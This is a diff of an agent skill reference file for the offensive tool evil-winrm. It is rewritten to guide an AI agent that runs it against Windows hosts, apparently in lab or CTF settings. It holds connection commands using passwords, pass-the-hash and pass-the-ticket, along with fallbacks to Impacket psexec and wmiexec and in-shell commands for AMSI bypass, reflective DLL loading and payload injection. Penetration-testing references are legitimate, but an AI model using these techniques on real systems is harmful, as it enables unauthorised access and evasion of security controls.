@@ -1,91 +1,49 @@
 ---
 name: evil-winrm
-description: "Auth/lab ref: Interactive WinRM shell for Windows remote management with support for pass-the-hash, pass-the-ticket, SSL, file upload/download, and PowerShell scripts."
-license: GPL-3.0
-compatibility: "Linux, macOS."
-metadata:
-  author: AeonDave
-  version: "1.0"
+description: "Interactive WinRM shell: Handles domain routing, non-interactive execution constraints, Pass-the-Hash, and path resolutions for Agent execution."
 ---
 
 # evil-winrm
 
-Interactive WinRM shell — the standard for Windows remote access in red team ops.
+**Goal**: Execute commands and obtain interactive sessions on Windows machines over WinRM (Ports 5985 HTTP / 5986 HTTPS).
 
-## Quick Start
+## Agent Constraints & Execution
 
-```bash
-# Connect with password
-evil-winrm -i 192.168.1.10 -u administrator -p Password123
+When an AI Agent executes `evil-winrm`, standard PTY interactive prompts usually fail or capture nothing via piping (`echo whoami | evil-winrm`). Do not attempt to pipe into it if the session hangs.
 
-# Pass-the-hash (NTLM)
-evil-winrm -i 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117
+Instead, when obtaining output programmatically through a shell:
+1. Locate the absolute path of the gem (e.g., `gem contents evil-winrm`, or `find / -name "evil-winrm" -type f`).
+2. Use an interactive shell controller, OR pass commands directly through single execution modes if supported.
+3. If `evil-winrm` hangs or drops output, switch to Impacket's `wmiexec.py` or `psexec.py` as fallbacks for initial command execution.
 
-# With SSL (port 5986)
-evil-winrm -i 192.168.1.10 -u admin -p Password123 -S
-```
+## The Domain/Realm Trap
+A common failure when attacking Active Directory via WinRM is attempting to pass the domain with the `-d` flag. **Modern versions of `evil-winrm` do not use `-d` for basic domain routing.**
 
-## Core Flags
+- If you are NOT using Kerberos tickets, **do not pass a domain flag**. Simply pass `-u <user>` and `-p <password>`. WinRM will automatically negotiate the domain if the host is a Domain Controller or joined to it.
+- If you ARE using Kerberos tickets (`-K`), you must specify the realm using `-r <realm>`. Note that Kerberos requires the FQDN to be passed to `-i` (e.g., `-i dc01.contoso.com`), not just the IP address, and the KDC must be configured in `/etc/krb5.conf`.
 
-| Flag | Description |
-|------|-------------|
-| `-i <ip>` | Target IP/hostname |
-| `-u <user>` | Username |
-| `-p <pass>` | Password |
-| `-H <hash>` | NTLM hash (LM:NT or NT only) |
-| `-P <port>` | WinRM port (default 5985) |
-| `-S` | Use SSL (port 5986) |
-| `-c <cert>` | Client certificate for auth |
-| `-r <realm>` | Kerberos realm |
-| `-s <path>` | Path to PowerShell scripts to load |
-| `-e <path>` | Path to executables (for upload) |
-| `-l <path>` | Log output to file |
-| `--no-colors` | Disable colors |
-
-## Shell Commands
-
-Once connected, use built-in evil-winrm commands:
-
-| Command | Description |
-|---------|-------------|
-| `upload <local> [remote]` | Upload file to target |
-| `download <remote> [local]` | Download file from target |
-| `menu` | Show available functions |
-| `Invoke-Binary <path>` | Execute binary from upload path |
-| `Bypass-4MSI` | AMSI bypass (built-in) |
-| `services` | List running services |
-| `exit` | Close session |
-
-## Common Workflows
+## Core Connection Patterns
 
 ```bash
-# Basic session
-evil-winrm -i 10.10.10.10 -u admin -p "Password123"
+# Basic connection (Let it negotiate Domain via NTLM auth inherently)
+evil-winrm -i 10.129.20.206 -u 'alex.turner' -p 'Checkpoint2024!'
 
-# Pass-the-hash after extracting hashes
-evil-winrm -i 10.10.10.10 -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c"
+# Pass-The-Hash (NTLM, Format: NT or LM:NT)
+evil-winrm -i 10.129.20.206 -u 'administrator' -H '8846f7eaee8fb117ad06bdd830b7586c'
 
-# Upload a tool and execute
-evil-winrm -i 10.10.10.10 -u admin -p pass -e /opt/tools/
-# Inside shell:
-# upload /opt/tools/winpeas.exe
-# ./winpeas.exe
+# Kerberos Pass-The-Ticket (-K supports both ccache and kirbi)
+# Note: IP must be the FQDN, and Realm must be specified
+evil-winrm -i dc01.checkpoint.htb -r checkpoint.htb -K /tmp/ticket.ccache
 
-# Load custom PS scripts
-evil-winrm -i 10.10.10.10 -u admin -p pass -s /opt/scripts/
-# Inside shell:
-# PowerView.ps1
-# Get-NetDomain
-
-# Kerberos auth (with valid ticket)
-export KRB5CCNAME=/tmp/admin.ccache
-evil-winrm -i dc.domain.local -r DOMAIN.LOCAL -u admin
+# Over SSL (e.g., WinRM running on 5986 HTTPS)
+evil-winrm -i 10.129.20.206 -u 'alex.turner' -p 'Checkpoint2024!' -S
 ```
 
-## Resources
-
-| File | When to load |
-|------|--------------|
-| `references/winrm-setup.md` | WinRM configuration, firewall rules, Kerberos auth setup |
-
-## Structuring This Skill
+## Built-In Menu Commands (Interactive Only)
+Once a successful interactive shell is caught via PTY, use `menu` to see options:
+- `upload /local/path [C:\remote\path]` (Remote path is optional, uses current dir)
+- `download C:\remote\path [/local/path]`
+- `Bypass-4MSI` (Attempts to patch AMSI in memory)
+- `Dll-Loader -local -path C:\temp\pwn.dll` (Loads DLL reflectively in memory)
+- `Donut-Loader -process_id [PID] -donutfile /tmp/payload.bin` (Injects x64 Donut payloads)
+- `Invoke-Binary /path/to/Rubeus.exe 'param1, param2'` (Executes .NET assemblies directly from memory).
